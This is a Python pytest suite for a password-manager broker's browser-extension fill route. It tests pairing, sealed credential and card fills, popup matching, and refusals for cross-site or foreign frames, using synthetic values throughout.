"""Extension fill route: broker policy, pairing, popup selection and host framing.

A scripted fake extension answers the broker's frame, pin and fill requests the
way the real service worker does, from a synthetic tab model. Real-browser
coverage of the DOM checks is in test_extension_browser.py. Synthetic values only.
"""
from dataclasses import dataclass
import hashlib
import io
import json
import os
from pathlib import Path
import socket
import struct
import sys
import threading
import time
from types import SimpleNamespace

import pytest

from pykeepass.exceptions import CredentialsError
from akdbx import extension_host, extension_route as route
from akdbx.broker import Broker
from akdbx.browser_card import failure as card_failure
from akdbx.cards import FIELDS as CARD_FIELDS, MARKER as CARD_MARKER
from akdbx.identities import MARKER as IDENTITY_MARKER, property_key
from akdbx.protocol import MAX_MESSAGE, receive_message, send_message
from akdbx.target import failure
from test_broker import Entry, RecordingTyper, Vault

PASSWORD = 'Synthetic-only password 42!'
USERNAME = 'synthetic.user@example.test'
CARD = dict(name='Synthetic Holder', number='4111111111111111', month='09', year='2031', csc='123')
TOP = 'https://shop.example.com/checkout'
LOGIN = 'https://www.example.com/login'
STRIPE = 'https://js.stripe.com/v3/elements-inner-accessory-target-' + 'a' * 32 + '.html'
STRIPE_CARD_ELEMENT = ('https://js.stripe.com/v3/elements-inner-card-' + 'c' * 32 +
                       '.html#__shared_params__[version]=v3&componentName=card')


# The fake extension reports the shipped version, which the keys bind (0.4.0+).
BUILT = extension_host.built_version()  # What a current extension reports.
BOUND = b'/' + BUILT.encode()
# The same MAJOR.MINOR.PATCH with other contents.
OTHER_BUILD = route.EXTENSION_VERSION + '.' + str((int(BUILT.rsplit('.', 1)[1]) + 1) % 65536)


def new_key():
    """A synthetic extension ECDH key pair: private key and raw public point."""
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    private = ec.generate_private_key(ec.SECP256R1())
    return private, private.public_key().public_bytes(serialization.Encoding.X962,
                                                      serialization.PublicFormat.UncompressedPoint)


def unseal(private, raw, broker_raw, sealed, context):
    """Decrypt a sealed value the way background.js does."""
    import base64
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    shared = private.exchange(ec.ECDH(), ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), broker_raw))
    key = HKDF(hashes.SHA256(), 32, salt=bytes(32), info=route.HKDF_INFO + BOUND + raw + broker_raw).derive(shared)
    decode = lambda text: base64.urlsafe_b64decode(text + '=' * (-len(text) % 4))
    return json.loads(AESGCM(key).decrypt(decode(sealed['iv']), decode(sealed['data']), context.encode()))


def seal_capture(private, raw, broker_raw, value, facts, context):
    """Seal a captured value to the broker the way background.js sealCapture does."""
    import base64
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    shared = private.exchange(ec.ECDH(), ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), broker_raw))
    key = HKDF(hashes.SHA256(), 32, salt=bytes(32), info=route.CAPTURE_INFO + BOUND + raw + broker_raw).derive(shared)
    nonce = os.urandom(12)
    data = AESGCM(key).encrypt(nonce, json.dumps(dict(value=value, facts=facts)).encode(), context.encode())
    return dict(iv=route.b64url(nonce), data=route.b64url(data))


EXTENSION_PRIVATE, EXTENSION_PUBLIC = new_key()
KEY = route.b64url(EXTENSION_PUBLIC)


class CardEntry(Entry):
    def get_custom_property(self, key):
        return {CARD_MARKER: 'v1', **{field: CARD[k] for k, field in CARD_FIELDS.items()}}.get(key)


class IdentityEntry(Entry):
    _element = None

    def get_custom_property(self, key):
        return {IDENTITY_MARKER: 'v1', property_key('given-name'): 'Synthetic',
                property_key('postal-code'): '12345'}.get(key)


@dataclass
class Document:
    id: str
    url: str
    parent: str | None = None


class FakeExtension:
    """Answers broker calls like background.js, from a synthetic browser model."""

    def __init__(self, tabs):
        self.tabs = tabs          # tab id -> list[Document], first is the top document
        self.pins = {}
        self.filled = []
        self.calls = []
        self.fill_state = 'filled'
        self.secret = None         # What a read pin's element shows.
        self.read_reply = None     # Optional override of the read reply, for forgery tests.

    def chain(self, tab, document):
        documents = {d.id: d for d in self.tabs.get(tab, [])}
        found, chain = documents.get(document), []
        while found is not None:
            chain.insert(0, dict(document_id=found.id, url=found.url))
            found = documents.get(found.parent)
        return chain or None

    def handle(self, op, payload):
        self.calls.append(op)
        if op == 'frames':
            tabs = [dict(tab_id=t, frames=[dict(document_id=d.id, parent_document_id=d.parent, url=d.url,
                                                visible_fields=dict(password=1, text=1)) for d in docs])
                    for t, docs in self.tabs.items() if docs[0].url == payload['top_url']
                    and payload['tab_id'] in (None, t)]
            return dict(ok=True, tabs=tabs)
        if op == 'pin':
            chain = self.chain(payload['tab_id'], payload['document_id'])
            if not chain or chain[0]['url'] != payload['top_url'] or payload['spec']['selector'] == '#missing':
                return dict(ok=False)
            pin_id = format(len(self.pins) + 1, '032x')
            self.pins[pin_id] = dict(kind=payload['kind'], spec=payload['spec'])
            return dict(ok=True, pin_id=pin_id, chain=chain)
        if op == 'fill':
            if payload['pin_id'] not in self.pins or self.chain(payload['tab_id'], payload['document_id']) != payload['chain']:
                return dict(state='refused')
            stored = self.pins.pop(payload['pin_id'])
            sealed = unseal(EXTENSION_PRIVATE, EXTENSION_PUBLIC, self.channel.broker_public_key, payload['sealed'],
                            'fill:' + payload['pin_id'])
            facts = sealed['facts']
            # The broker sealed exactly the facts of the pin it authorized.
            assert facts == dict(tab_id=payload['tab_id'], document_id=payload['document_id'], chain=payload['chain'],
                                 kind=payload['kind'], pin_id=payload['pin_id'], spec=stored['spec'],
                                 max_age_ms=payload['max_age_ms'])
            values = sealed['values']
            if self.fill_state == 'filled':
                self.filled.append(values)
            return dict(state=self.fill_state)
        if op == 'read':
            if payload['pin_id'] not in self.pins or self.chain(payload['tab_id'], payload['document_id']) != payload['chain']:
                return dict(state='refused')
            stored = self.pins.pop(payload['pin_id'])
            sealed = unseal(EXTENSION_PRIVATE, EXTENSION_PUBLIC, self.channel.broker_public_key, payload['sealed'],
                            'read:' + payload['pin_id'])
            facts = sealed['facts']
            assert facts == dict(tab_id=payload['tab_id'], document_id=payload['document_id'], chain=payload['chain'],
                                 kind='read', pin_id=payload['pin_id'], spec=stored['spec'],
                                 max_age_ms=payload['max_age_ms']) and sealed['values'] == {}
            if self.read_reply is not None:
                return self.read_reply(payload)
            if self.secret is None:
                return dict(state='refused')
            bound = dict(tab_id=facts['tab_id'], document_id=facts['document_id'], chain=facts['chain'],
                         pin_id=facts['pin_id'])
            return dict(state='read', sealed=seal_capture(EXTENSION_PRIVATE, EXTENSION_PUBLIC,
                                                          self.channel.broker_public_key, self.secret, bound,
                                                          'capture:' + facts['pin_id']))
        if op == 'release':
            self.pins.pop(payload['pin_id'], None)
            return dict(ok=True)
        return dict(ok=False)


class FakeChannel(route.Channel):
    def __init__(self, hub, extension, browser='helium', version=BUILT):
        super().__init__(hub, None, browser, EXTENSION_PUBLIC, version)
        self.extension = extension
        extension.channel = self

    def send(self, message):
        pass

    def call(self, op, timeout, **payload):
        return self.extension.handle(op, payload)

    def notify(self, op, **payload):
        self.extension.handle(op, payload)


def make_broker(entries=None, *, locked=False, now=None):
    clock = (lambda: now[0]) if now is not None else None
    entries = entries if entries is not None else [Entry(username=USERNAME, password=PASSWORD, url=LOGIN)]
    options = dict(clock=clock) if clock else {}
    broker = Broker(None if locked else Vault(entries), RecordingTyper(), **options)
    broker.writes.public_base = 'https://unlock.example.test:9443'
    return broker


def attach(broker, tabs, *, paired=True):
    extension = FakeExtension(tabs)
    channel = FakeChannel(broker.extension, extension)
    broker.extension.channels[channel.id] = channel
    if paired:
        broker.extension.approved.append(channel.digest)
    return channel, extension


def search(broker, query=''):
    return broker.dispatch(dict(action='search', query=query))['entries'][0]['handle']


def pin_password(broker, channel, tab, document, top, **extra):
    request = dict(action='pin-password-target', password_protocol=1, page_id=f'{channel.id}.{tab}',
                   frame_id=document, top_url=top, selector='#password', mode='password', route='extension')
    request.update(extra)
    return broker.dispatch(request)


# ----- status and pairing -------------------------------------------------
def test_status_advertises_the_extension_route_without_a_connection():
    status = make_broker().dispatch(dict(action='ping'))
    assert status['extension_protocol'] == 1 and status['extension_delivery'] == route.DELIVERY
    assert status['fill_routes'] == ['cdp', 'extension'] and status['default_fill_route'] == 'cdp'
    assert status['extension_connected'] is False and status['extension_paired'] is False
    assert status['extension_id'] == route.EXTENSION_ID and 'extension_pairing' not in status


def test_unpaired_channel_gets_no_pin_no_match_and_a_pairing_link():
    broker = make_broker()
    channel, extension = attach(broker, {7: [Document('TOP', LOGIN)]}, paired=False)
    status = broker.dispatch(dict(action='ping'))
    assert status['extension_connected'] is True and status['extension_paired'] is False
    [pairing] = status['extension_pairing']
    assert pairing['url'].startswith('https://unlock.example.test:9443/extension/pair?token=')
    assert len(pairing['code']) == 9 and pairing['code'][4] == '-'
    assert pin_password(broker, channel, 7, 'TOP', LOGIN) == failure()
    assert extension.calls == []
    match = broker.extension.popup(channel, dict(type='request', id='p1', op='match'))
    assert match['ok'] is False and 'paired' in match['error']


def test_pairing_approves_only_the_shown_key_once():
    broker = make_broker()
    channel, _ = attach(broker, {}, paired=False)
    info = broker.extension._pairing_info(channel.digest)
    token = info['url'].split('token=')[1]
    assert broker.extension.pairing_code(token) == info['code']
    assert broker.extension.pairing_code('wrong') is None
    assert broker.extension.approve(token) is True
    assert broker.extension.approve(token) is False  # One use.
    assert broker.dispatch(dict(action='ping'))['extension_paired'] is True


def test_pairing_expires(monkeypatch):
    now = [100.0]
    broker = make_broker(now=now)
    channel, _ = attach(broker, {}, paired=False)
    token = broker.extension._pairing_info(channel.digest)['url'].split('token=')[1]
    now[0] += route.PAIRING_TTL
    assert broker.extension.pairing_code(token) is None and broker.extension.approve(token) is False


# ----- agent route: passwords -----------------------------------------------
def test_frame_listing_has_the_cdp_shape_without_urls():
    broker = make_broker()
    channel, _ = attach(broker, {3: [Document('TOP', LOGIN), Document('AUTH', 'https://auth.example.com/x?code=1', 'TOP'),
                                     Document('EVIL', 'https://evil.example.net/login', 'TOP')]})
    listing = broker.dispatch(dict(action='list-password-frames', password_protocol=1, frame_protocol=1,
                                   top_url=LOGIN, route='extension'))
    assert listing['ok'] and listing['route'] == 'extension' and listing['page_id'] == channel.id + '.3'
    assert listing['main_frame_id'] == 'TOP' and 'code=1' not in json.dumps(listing)
    frames = {f['frame_id']: f for f in listing['frames']}
    assert frames['AUTH']['origin'] == 'https://auth.example.com' and frames['AUTH']['eligible'] is True
    assert frames['EVIL']['eligible'] is False and frames['EVIL']['visible_fields'] is None
    from akdbx.cli import _valid_frame_list
    assert _valid_frame_list(listing)


def test_main_frame_password_fill_reaches_only_the_pinned_element():
    broker = make_broker()
    channel, extension = attach(broker, {3: [Document('TOP', LOGIN)]})
    pin = pin_password(broker, channel, 3, 'TOP', LOGIN)
    assert pin == dict(ok=True, target=pin['target'], expires_in=30, target_delivery=route.DELIVERY)
    receipt = broker.dispatch(dict(action='fill', handle=search(broker), mode='password', target=pin['target'],
                                   target_protocol=1))
    assert receipt == dict(ok=True, filled='password', target_delivery=route.DELIVERY)
    assert extension.filled == [dict(mode='password', username='', password=PASSWORD)]
    assert PASSWORD not in json.dumps(receipt)
    # Single use: the same target never fills twice.
    again = broker.dispatch(dict(action='fill', handle=search(broker), mode='password', target=pin['target'],
                                 target_protocol=1))
    assert again['ok'] is False and len(extension.filled) == 1


def test_login_mode_fills_both_pinned_fields():
    broker = make_broker()
    channel, extension = attach(broker, {3: [Document('TOP', LOGIN)]})
    pin = pin_password(broker, channel, 3, 'TOP', LOGIN, mode='login', username_selector='#username')
    assert pin['ok']
    assert broker.dispatch(dict(action='fill', handle=search(broker), mode='login', target=pin['target'],
                                target_protocol=1))['ok']
    assert extension.filled == [dict(mode='login', username=USERNAME, password=PASSWORD)]


def test_wrong_origin_credential_is_refused_before_any_value_leaves():
    broker = make_broker([Entry(username=USERNAME, password=PASSWORD, url='https://other.example.org/')])
    channel, extension = attach(broker, {3: [Document('TOP', LOGIN)]})
    pin = pin_password(broker, channel, 3, 'TOP', LOGIN)
    assert broker.dispatch(dict(action='fill', handle=search(broker), mode='password', target=pin['target'],
                                target_protocol=1)) == failure()
    assert extension.filled == [] and 'fill' not in extension.calls


@pytest.mark.parametrize('case', ['wrong-top', 'child-without-origin', 'cross-site-frame', 'origin-mismatch',
                                  'missing-element', 'read-mode', 'bad-page', 'other-channel'])
def test_password_pin_refuses_a_destination_it_cannot_prove(case):
    broker = make_broker()
    tabs = {3: [Document('TOP', LOGIN), Document('AUTH', 'https://auth.example.com/login', 'TOP'),
                Document('EVIL', 'https://evil.example.net/login', 'TOP')]}
    channel, extension = attach(broker, tabs)
    args = {
        'wrong-top': dict(document='TOP', top='https://www.example.com/other'),
        'child-without-origin': dict(document='AUTH'),
        'cross-site-frame': dict(document='EVIL', frame_protocol=1, frame_origin='https://evil.example.net'),
        'origin-mismatch': dict(document='AUTH', frame_protocol=1, frame_origin='https://www.example.com'),
        'missing-element': dict(document='TOP', selector='#missing'),
        'read-mode': dict(document='TOP', mode='read'),
        'bad-page': dict(document='TOP', page_id='not-a-page'),
        'other-channel': dict(document='TOP', page_id='00000000.3'),
    }[case]
    document, top = args.pop('document'), args.pop('top', LOGIN)
    assert pin_password(broker, channel, 3, document, top, **args) == failure()
    assert not broker.extension.pins and not extension.pins  # Any element pinned was released.


def test_same_site_child_frame_fills_when_the_credential_origin_matches():
    broker = make_broker([Entry(username=USERNAME, password=PASSWORD, url='https://auth.example.com/')])
    channel, extension = attach(broker, {3: [Document('TOP', LOGIN), Document('AUTH', 'https://auth.example.com/login', 'TOP')]})
    pin = pin_password(broker, channel, 3, 'AUTH', LOGIN, frame_protocol=1, frame_origin='https://auth.example.com')
    assert pin['ok'], pin
    assert broker.dispatch(dict(action='fill', handle=search(broker), mode='password', target=pin['target'],
                                target_protocol=1))['ok']
    assert extension.filled[0]['password'] == PASSWORD


def test_expired_pin_and_changed_frame_never_fill():
    now = [10.0]
    broker = make_broker(now=now)
    tabs = {3: [Document('TOP', LOGIN)]}
    channel, extension = attach(broker, tabs)
    pin = pin_password(broker, channel, 3, 'TOP', LOGIN)
    now[0] += route.TTL
    assert broker.dispatch(dict(action='fill', handle=search(broker), mode='password', target=pin['target'],
                                target_protocol=1, start_deadline=now[0] + 4)) == failure()
    pin = pin_password(broker, channel, 3, 'TOP', LOGIN)
    tabs[3][0] = Document('NEW', LOGIN)  # A navigation replaces the document.
    assert broker.dispatch(dict(action='fill', handle=search(broker), mode='password', target=pin['target'],
                                target_protocol=1, start_deadline=now[0] + 4)) == failure()
    assert extension.filled == []


def test_uncertain_browser_answer_is_reported_as_uncertain():
    broker = make_broker()
    channel, extension = attach(broker, {3: [Document('TOP', LOGIN)]})
    extension.fill_state = 'lost'
    pin = pin_password(broker, channel, 3, 'TOP', LOGIN)
    assert broker.dispatch(dict(action='fill', handle=search(broker), mode='password', target=pin['target'],
                                target_protocol=1)) == failure(True)


def test_default_route_extension_applies_to_requests_without_a_route():
    broker = Broker(Vault([Entry(username=USERNAME, password=PASSWORD, url=LOGIN)]), RecordingTyper(),
                    default_fill_route='extension')
    channel, extension = attach(broker, {3: [Document('TOP', LOGIN)]})
    request = dict(action='pin-password-target', password_protocol=1, page_id=f'{channel.id}.3', frame_id='TOP',
                   top_url=LOGIN, selector='#password', mode='password')
    assert broker.dispatch(request)['target_delivery'] == route.DELIVERY
    with pytest.raises(ValueError):
        Broker(None, RecordingTyper(), default_fill_route='keyboard')


# ----- agent route: cards and identities -------------------------------------
def card_pin(broker, channel, document, field='cc-number', **extra):
    request = dict(action='pin-card-target', card_protocol=1, page_id=f'{channel.id}.5', frame_id=document,
                   top_url=TOP, selector='#number', field=field, route='extension')
    request.update(extra)
    return broker.dispatch(request)


def test_card_fills_merchant_frame_and_supported_processor_frame():
    broker = make_broker([CardEntry()])
    tabs = {5: [Document('TOP', TOP), Document('SAME', 'https://shop.example.com/pay', 'TOP'),
                Document('STRIPE', STRIPE, 'SAME'), Document('CARD', STRIPE_CARD_ELEMENT, 'TOP')]}
    channel, extension = attach(broker, tabs)
    stripe = dict(processor='stripe', processor_protocol=1)
    for document, extra in (('TOP', {}), ('SAME', {}), ('STRIPE', stripe), ('CARD', stripe)):
        pin = card_pin(broker, channel, document, **extra)
        assert pin == dict(ok=True, target=pin['target'], expires_in=30, field='cc-number', card_delivery=route.DELIVERY)
        handle = broker.dispatch(dict(action='search-cards', card_protocol=1))['entries'][0]['handle']
        receipt = broker.dispatch(dict(action='fill-card', card_protocol=1, handle=handle, target=pin['target'],
                                       field='cc-number'))
        assert receipt == dict(ok=True, filled='cc-number', card_delivery=route.DELIVERY)
    assert [v['value'] for v in extension.filled] == [CARD['number']] * 4


@pytest.mark.parametrize('case', ['foreign-frame', 'processor-not-claimed', 'processor-wrong-url',
                                  'processor-under-foreign-parent', 'processor-field', 'asserted-url',
                                  'card-element-not-claimed', 'card-element-field', 'card-element-foreign-host',
                                  'card-element-wrong-path'])
def test_card_pin_refuses_frames_outside_the_merchant_and_processor_rules(case):
    broker = make_broker([CardEntry()])
    tabs = {5: [Document('TOP', TOP), Document('FOREIGN', 'https://pay.attacker.example/frame', 'TOP'),
                Document('STRIPE', STRIPE, 'TOP'), Document('WRAP', 'https://ads.example.net/', 'TOP'),
                Document('DEEP', STRIPE, 'WRAP'), Document('CARD', STRIPE_CARD_ELEMENT, 'TOP'),
                Document('FAKECARD', STRIPE_CARD_ELEMENT.replace('js.stripe.com', 'evil.example.net'), 'TOP'),
                Document('OTHERPATH', STRIPE_CARD_ELEMENT.replace('inner-card-', 'inner-cards-'), 'TOP')]}
    channel, extension = attach(broker, tabs)
    stripe = dict(processor='stripe', processor_protocol=1)
    document, extra = {
        'foreign-frame': ('FOREIGN', {}),
        'processor-not-claimed': ('STRIPE', {}),
        'processor-wrong-url': ('FOREIGN', stripe),
        'processor-under-foreign-parent': ('DEEP', stripe),
        'processor-field': ('STRIPE', dict(stripe, field='cc-name')),
        'asserted-url': ('TOP', dict(frame_url=TOP + '?other')),
        'card-element-not-claimed': ('CARD', {}),
        'card-element-field': ('CARD', dict(stripe, field='cc-name')),
        'card-element-foreign-host': ('FAKECARD', stripe),
        'card-element-wrong-path': ('OTHERPATH', stripe),
    }[case]
    field = extra.pop('field', 'cc-number')
    assert card_pin(broker, channel, document, field, **extra) == card_failure()
    assert not broker.extension.pins and not extension.pins


def test_identity_goes_only_to_frames_of_the_top_origin():
    broker = make_broker([IdentityEntry(title='Home')])
    tabs = {5: [Document('TOP', TOP), Document('FOREIGN', 'https://maps.example.net/', 'TOP')]}
    channel, extension = attach(broker, tabs)

    def pin(document):
        return broker.dispatch(dict(action='pin-identity-target', identity_protocol=1, page_id=f'{channel.id}.5',
                                    frame_id=document, top_url=TOP, selector='#given', field='given-name',
                                    route='extension'))
    assert pin('FOREIGN') == card_failure(kind='identity')
    target = pin('TOP')
    assert target['identity_delivery'] == route.DELIVERY
    handle = broker.dispatch(dict(action='search-identities', identity_protocol=1, query='Home'))['entries'][0]['handle']
    receipt = broker.dispatch(dict(action='fill-identity', identity_protocol=1, handle=handle, target=target['target'],
                                   field='given-name', start_deadline=broker.clock() + 4))
    assert receipt == dict(ok=True, filled='given-name', identity_delivery=route.DELIVERY)
    assert extension.filled == [dict(value='Synthetic')]


# ----- user-click popup route ------------------------------------------------
def popup(broker, channel, op, **payload):
    result = broker.extension.popup(channel, dict(type='request', id='p1', op=op, **payload))
    if op == 'match' and result.get('ok'):
        # The match list is sealed with the facts it answers, like values.
        assert set(result) == {'ok', 'sealed'}
        opened = unseal(EXTENSION_PRIVATE, EXTENSION_PUBLIC, channel.broker_public_key, result['sealed'], 'match')
        assert opened['facts'] == {k: payload[k] for k in ('tab_id', 'document_id', 'chain', 'kind')}
        return dict(ok=True, kind=payload['kind'], entries=opened['values']['entries'])
    return result


def facts(document='TOP', top=LOGIN, chain=None, tab=3):
    return dict(tab_id=tab, document_id=document, top_url=top, chain=chain or [dict(document_id='TOP', url=top)])


def test_popup_match_returns_metadata_only_and_release_is_bound_to_the_document():
    broker = make_broker([Entry(username=USERNAME, password=PASSWORD, url=LOGIN),
                          Entry(username='other', password='x', url='https://other.example.org/')])
    channel, _ = attach(broker, {})
    match = popup(broker, channel, 'match', kind='login', **facts())
    assert match['ok'] and [set(e) for e in match['entries']] == [{'title', 'username', 'handle'}]
    assert PASSWORD not in json.dumps(match) and match['entries'][0]['username'] == USERNAME
    handle = match['entries'][0]['handle']
    wrong = popup(broker, channel, 'release', handle=handle, roles=['password'], formats={},
                  **facts(chain=[dict(document_id='TOP', url=LOGIN)], document='TOP', tab=4))
    assert wrong['ok'] is False
    # The handle was spent by the refused attempt: match again.
    assert popup(broker, channel, 'release', handle=handle, roles=['password'], formats={}, **facts())['ok'] is False
    handle = popup(broker, channel, 'match', kind='login', **facts())['entries'][0]['handle']
    released = popup(broker, channel, 'release', handle=handle, roles=['username', 'password'], formats={}, **facts())
    assert set(released) == {'ok', 'sealed'} and PASSWORD not in json.dumps(released)
    assert unseal(EXTENSION_PRIVATE, EXTENSION_PUBLIC, channel.broker_public_key, released['sealed'],
                  'release:' + handle) == dict(values=dict(username=USERNAME, password=PASSWORD),
                                               facts=dict(tab_id=3, document_id='TOP', kind='login',
                                                          chain=[dict(document_id='TOP', url=LOGIN)],
                                                          roles=['username', 'password'], formats={}))
    # A ciphertext answers only its own selection: another context fails.
    with pytest.raises(Exception):
        unseal(EXTENSION_PRIVATE, EXTENSION_PUBLIC, channel.broker_public_key, released['sealed'], 'release:other')
    # A process without the extension's private key cannot read it.
    stranger, stranger_public = new_key()
    with pytest.raises(Exception):
        unseal(stranger, EXTENSION_PUBLIC, channel.broker_public_key, released['sealed'], 'release:' + handle)


def test_popup_refuses_cross_site_login_frames_and_foreign_card_frames():
    broker = make_broker([Entry(username=USERNAME, password=PASSWORD, url='https://evil.example.net/'), CardEntry()])
    channel, _ = attach(broker, {})
    chain = [dict(document_id='TOP', url=LOGIN), dict(document_id='EVIL', url='https://evil.example.net/login')]
    assert popup(broker, channel, 'match', kind='login', **facts('EVIL', chain=chain))['ok'] is False
    chain = [dict(document_id='TOP', url=TOP), dict(document_id='F', url='https://pay.attacker.example/')]
    assert popup(broker, channel, 'match', kind='card', **facts('F', top=TOP, chain=chain))['ok'] is False
    chain = [dict(document_id='TOP', url=TOP), dict(document_id='S', url=STRIPE)]
    match = popup(broker, channel, 'match', kind='card', **facts('S', top=TOP, chain=chain))
    assert match['ok'] and set(match['entries'][0]) == {'title', 'brand', 'last_four', 'handle'}
    assert CARD['number'] not in json.dumps(match)
    handle = match['entries'][0]['handle']
    released = popup(broker, channel, 'release', handle=handle, roles=['cc-number', 'cc-exp'],
                     formats={'cc-exp': 'MM/YY'}, **facts('S', top=TOP, chain=chain))
    assert CARD['number'] not in json.dumps(released)
    assert unseal(EXTENSION_PRIVATE, EXTENSION_PUBLIC, channel.broker_public_key, released['sealed'],
                  'release:' + handle)['values'] == {'cc-number': CARD['number'], 'cc-exp': '09/31'}


@pytest.mark.parametrize('case', ['processor-frame', 'top-level', 'nested', 'identity-top-level',
                                  'login-top-level'])
def test_popup_never_matches_a_stripe_card_element_document(case):
    """The classic Card Element is pin-route only: the popup offers nothing there."""
    broker = make_broker([CardEntry(), Entry(username=USERNAME, password=PASSWORD, url=STRIPE_CARD_ELEMENT)])
    channel, _ = attach(broker, {})
    top, kind = TOP, 'card'
    chain = {
        'processor-frame': [dict(document_id='TOP', url=TOP), dict(document_id='C', url=STRIPE_CARD_ELEMENT)],
        'top-level': [dict(document_id='C', url=STRIPE_CARD_ELEMENT)],
        'nested': [dict(document_id='TOP', url=TOP), dict(document_id='SAME', url='https://shop.example.com/pay'),
                   dict(document_id='C', url=STRIPE_CARD_ELEMENT)],
        'identity-top-level': [dict(document_id='C', url=STRIPE_CARD_ELEMENT)],
        'login-top-level': [dict(document_id='C', url=STRIPE_CARD_ELEMENT)],
    }[case]
    if case.endswith('top-level'):
        top = STRIPE_CARD_ELEMENT
    if case.startswith('identity'):
        kind = 'identity'
    elif case.startswith('login'):
        kind = 'login'
    assert popup(broker, channel, 'match', kind=kind, **facts('C', top=top, chain=chain)) == dict(
        ok=False, error='extension request refused; page, frame or field not supported')
    assert not broker.extension.selections


def test_popup_release_refuses_a_stripe_card_element_selection():
    broker = make_broker([CardEntry()])
    channel, _ = attach(broker, {})
    chain = [dict(document_id='TOP', url=TOP), dict(document_id='C', url=STRIPE_CARD_ELEMENT)]
    entry = next(iter(broker.vault.entries))
    # Even a selection for that document (none is issued) releases nothing.
    broker.extension.selections['h' * 64] = route.Selection(entry, channel.id, 3, 'C', 'card', chain,
                                                            broker.extension.clock() + 60)
    released = popup(broker, channel, 'release', handle='h' * 64, roles=['cc-number', 'cc-exp', 'cc-csc'],
                     formats={'cc-exp': 'MM/YY'}, **facts('C', top=TOP, chain=chain))
    assert released == dict(ok=False, error='extension request refused; page, frame or field not supported')
    assert CARD['number'] not in json.dumps(released)


def test_card_element_pin_route_still_fills_while_the_popup_refuses():
    broker = make_broker([CardEntry()])
    tabs = {5: [Document('TOP', TOP), Document('CARD', STRIPE_CARD_ELEMENT, 'TOP')]}
    channel, extension = attach(broker, tabs)
    chain = [dict(document_id='TOP', url=TOP), dict(document_id='CARD', url=STRIPE_CARD_ELEMENT)]
    assert popup(broker, channel, 'match', kind='card', **facts('CARD', top=TOP, chain=chain, tab=5))['ok'] is False
    for field, options, expected in (('cc-number', {}, CARD['number']), ('cc-exp', {'format': 'MM/YY'}, '09/31'),
                                     ('cc-csc', {}, CARD['csc'])):
        pin = card_pin(broker, channel, 'CARD', field, processor='stripe', processor_protocol=1)
        assert pin['ok'], pin
        handle = broker.dispatch(dict(action='search-cards', card_protocol=1))['entries'][0]['handle']
        receipt = broker.dispatch(dict(action='fill-card', card_protocol=1, handle=handle, target=pin['target'],
                                       field=field, **options))
        assert receipt == dict(ok=True, filled=field, card_delivery=route.DELIVERY)
    assert [v['value'] for v in extension.filled] == [CARD['number'], '09/31', CARD['csc']]


def test_popup_on_locked_broker_reports_locked_and_releases_nothing():
    broker = make_broker(locked=True)
    broker.unlock_url = 'https://unlock.example.test:9443/?token=synthetic'
    channel, _ = attach(broker, {})
    result = popup(broker, channel, 'match', kind='login', **facts())
    assert result == dict(ok=False, error='vault locked', unlock_url=broker.unlock_url)
    state = popup(broker, channel, 'state')
    assert state['ok'] and state['locked'] is True and state['paired'] is True


def test_popup_skips_expired_cards():
    class Expired(CardEntry):
        def get_custom_property(self, key):
            return {**{CARD_MARKER: 'v1'}, **{f: v for f, v in ((CARD_FIELDS[k], CARD[k]) for k in CARD)},
                    CARD_FIELDS['year']: '2020'}.get(key)
    broker = make_broker([Expired()])
    channel, _ = attach(broker, {})
    assert popup(broker, channel, 'match', kind='card', **facts(top=TOP, chain=[dict(document_id='TOP', url=TOP)]))['entries'] == []


# ----- attach over a real socket -----------------------------------------------
@pytest.fixture
def pair_of_sockets(monkeypatch):
    import select as select_module

    def readable(connection, timeout):
        return bool(select_module.select([connection], [], [], timeout)[0])
    monkeypatch.setattr(route, '_wait_readable', readable)
    left, right = socket.socketpair()
    yield left, right
    left.close()
    right.close()


@pytest.mark.parametrize('request_fields', [
    dict(extension_id='a' * 32), dict(public_key='short'), dict(public_key='A' * 87), dict(extension_protocol=2),
    dict(browser='other'),
    dict(extra=True)])
def test_attach_refuses_other_extensions_keys_and_protocols(pair_of_sockets, request_fields):
    broker_side, host_side = pair_of_sockets
    request = dict(action='extension-attach', extension_protocol=1, extension_id=route.EXTENSION_ID,
                   browser='helium', public_key=KEY)
    request.update(request_fields)
    broker = make_broker()
    broker.extension.attach(broker_side, request)
    assert receive_message(host_side) == dict(type='error', error='extension attach refused')
    assert broker.extension.channels == {}


def test_attach_serves_calls_and_popup_requests_over_one_connection(pair_of_sockets):
    broker_side, host_side = pair_of_sockets
    broker = make_broker()
    request = dict(action='extension-attach', extension_protocol=1, extension_id=route.EXTENSION_ID,
                   browser='edge', public_key=KEY)
    worker = threading.Thread(target=broker.extension.attach, args=(broker_side, request), daemon=True)
    worker.start()
    attached = receive_message(host_side)
    assert attached['type'] == 'attached' and attached['paired'] is False and attached['pairing']['code']
    assert attached['broker_public_key'] and attached['pairing']['code'] == route.pairing_code(
        hashlib.sha256(EXTENSION_PUBLIC).digest())
    broker.extension.approved.append(hashlib.sha256(EXTENSION_PUBLIC).digest())
    channel = broker.extension._paired_channel()[0]
    result = {}
    caller = threading.Thread(target=lambda: result.update(channel.call('frames', 5, top_url=LOGIN, tab_id=None)))
    caller.start()
    call = receive_message(host_side)
    assert call['type'] == 'call' and call['op'] == 'frames'
    send_message(host_side, dict(type='reply', id=call['id'], result=dict(ok=True, tabs=[])))
    caller.join(5)
    assert result == dict(ok=True, tabs=[])
    send_message(host_side, dict(type='request', id='p1', op='state'))
    response = receive_message(host_side)
    assert response['type'] == 'response' and response['result']['paired'] is True
    host_side.close()
    worker.join(5)
    assert broker.extension.channels == {}


# ----- native messaging framing --------------------------------------------------
def frame(value):
    data = json.dumps(value).encode() if not isinstance(value, bytes) else value
    return struct.pack('<I', len(data)) + data


@pytest.mark.parametrize('raw', [struct.pack('<I', 0), struct.pack('<I', MAX_MESSAGE + 1) + b'{}',
                                 struct.pack('<I', 10) + b'{}', b'\x01\x00', frame(b'[1]'), frame(b'\xff\xfe')])
def test_native_frames_refuse_bad_sizes_and_payloads(raw):
    with pytest.raises(extension_host.FrameError):
        extension_host.read_frame(io.BytesIO(raw))


